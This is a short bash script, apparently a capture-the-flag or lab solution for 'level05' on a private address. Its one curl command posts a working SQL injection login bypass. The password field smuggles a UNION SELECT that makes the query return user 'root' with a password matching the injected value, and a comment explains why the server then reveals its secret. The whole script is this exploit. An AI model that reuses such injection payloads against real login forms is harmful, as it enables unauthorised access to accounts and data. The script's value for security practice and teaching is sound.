#! /usr/bin/env bash

# Enter some random string on the password input, followed by some code to select the user 'root' and an
# arbitrary string as password, equal to the one we have just entered. This data will match the input and
# the server will display the secret.
curl --data "user=root" --data "pass=12345678' UNION SELECT user, '12345678' AS pass FROM users WHERE user='root' -- " http://10.0.23.24:8004/level05/index.php